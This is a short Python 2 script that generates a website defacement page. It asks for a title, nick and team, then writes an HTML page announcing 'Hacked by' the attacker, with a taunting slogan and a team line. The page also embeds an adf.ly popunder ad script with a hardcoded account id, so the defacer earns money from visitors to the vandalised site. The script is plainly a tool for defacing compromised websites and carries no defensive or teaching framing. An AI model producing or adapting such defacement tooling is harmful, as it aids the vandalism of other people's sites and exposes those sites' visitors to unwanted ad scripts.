#!/usr/bin/python
# coding: utf-8

title = raw_input("Title : ")
nick = raw_input("Nick : ")
team = raw_input("Team : ")

fo = open("script.html","w")

sbi1 = """<html> <head><script type="text/javascript">     var adfly_id = 19400118;     var popunder_frequency_delay = 0; </script> <script src="https://cdn.adf.ly/js/display.js"></script> <meta content='Hacked by <[SBI_22] property='og:title'/> <meta content='article' property='og:type'/> <meta content='http://www.ratiss.org/ioport5.htm' property='og:url'/> <title>"""

sbi2 = title

sbi3 = """</title> <body bgcolor=black> <center> <body bgcolor=black><table width=100% height=100%><td align=center><span style='font: 60px fantasy;size:60px; color:#c40505; text-shadow: 0px 0px 60px #000000;'> Hacked by """

sbi4 = nick

sbi5 = """</b></center> <center><font color=#c6c5c4 size=3 face=courier new>We Are Playing In Your Site</font></center> <center><table width=90% height=50%><td align=center><span style='font: 36px courier new; color:#a3a2a1;'><b>ALLAH SWT-MUHAMMAD SAW-"""

sbi6 = team

sbi7 = """-AND YOU</b></center></body></html>"""

fo.write(sbi1)
fo.write(sbi2)
fo.write(sbi3)
fo.write(sbi4)
fo.write(sbi5)
fo.write(sbi6)
fo.write(sbi7)

fo.close()
